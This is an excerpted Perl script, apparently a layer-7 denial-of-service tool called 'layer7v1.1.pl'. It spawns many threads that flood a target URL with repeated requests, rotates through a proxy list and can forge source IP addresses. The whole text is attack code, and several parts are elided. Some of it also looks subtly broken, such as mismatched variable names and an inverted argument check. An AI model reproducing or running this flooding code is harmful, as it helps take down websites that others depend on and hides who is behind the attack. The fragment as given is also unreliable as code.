...
sub comenzar {
    ...
    if($ipfake eq "") {
        ...
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto, $host, $paquetesender, $proxy_file));
        }
    } else {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion, $puerto, $host, $file, $proxy_file));
        }
    }
    print "[-] Launched!\n";
    for($v=0;$v<$max;$v++) {
...
sub get_proxy_list {
    my ($proxy_file) = @_;
    my @proxy_list;
    open(my $fh, '<', $proxy_file) or die "[-] Failed to open proxy file: $!";
    while(my $proxy = <$fh>) {
        chomp $proxy;
        push @proxy_list, $proxy;
    }
    close $fh;
    return @proxy_list;
}
...
sub choose_proxy {
    my ($proxy_file) = @_;
    my @proxy_list = get_proxy_list($proxy_file);
    my $proxy = $proxy_list[rand @proxy_list];
    return $proxy;
}

sub sender {
    my ($max, $puerto, $host, $file, $proxy_file) = @_;
    my $sock;
    while (1) {
        my $paquete = "";
        my $proxy = choose_proxy($proxy_file);
        $sock = socker($proxy, $puerto);
        unless($sock) {
            print "\n[x] Unable to connect to proxy $proxy...\n\n";
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
...
sub sender2 {
    my ($puerto, $host, $paquete, $proxy_file) = @_;
    my $sock;
    while (1) {
        my $proxy = choose_proxy($proxy_file);
        $sock = socker($proxy, $puerto);
...
if($#ARGV > 3) {
    ...
    die("Use: layer7v1.1.pl [url] [Connections] [Requests per connection] [Initial false IP (optional)] [Proxy file]\n");
}